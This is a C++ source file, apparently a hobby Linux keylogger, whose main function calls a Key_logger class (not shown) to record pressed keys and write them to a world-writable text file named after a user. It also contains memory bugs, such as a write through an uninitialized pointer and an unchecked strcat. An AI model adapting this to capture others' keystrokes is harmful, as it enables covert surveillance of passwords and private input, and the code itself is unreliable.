#define BUF (256)
#include <iostream>
#include <stdio.h>
#include <linux/input.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <errno.h>
#include <string.h>
#include <string>
#include <vector>
#include "key_logger.h"
#include <string>
#include <map>
#include <fstream>

#pragma region Функции
float GetComputerOperatingTime()
{
    char buf[BUF] = {'\0'};
    std::fstream fs("/proc/uptime", std::fstream::in);
    if(!fs.is_open())
        return 0;
    float a = -1,b;
    if ( !(fs.getline(buf, BUF).eof() )){
        if (sscanf(buf, "%f %f", &a, &b) != 2)
        {
            fs.close();
            return -1;
        }
    }
    fs.close();
    return a;
}

std::string CurrentDateTime()
{
    char *output;
    time_t seconds = time(nullptr);
    tm* timeinfo = localtime(&seconds);
    strcpy(output," Date:  ");
    strcat(output,asctime(timeinfo));
    return output;
}

void write_press_keys_to_file(const char* path, std::vector<const char*>& names)
{
    auto d_save = check(open(path, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO));

    for (int i = 0; i < names.size(); ++i)
    {
        write(d_save, names[i], strlen(names[i]));
    }

    close(d_save);
}
#pragma endregion

int main()
{ 
    #pragma region Кей логгер 
    Key_logger name_of_the_keys;
    
    #pragma region  Ввод пути
    char Name[100];
    std::cout << "Enter the name of the user >> ";
    std::cin >> Name;
    auto path = strcat(Name, ".txt");
    #pragma endregion

    std::vector<const char*> names;
    names = name_of_the_keys.get_keys_vector(path);
    write_press_keys_to_file(path, names);
    #pragma endregion
    return 0;
}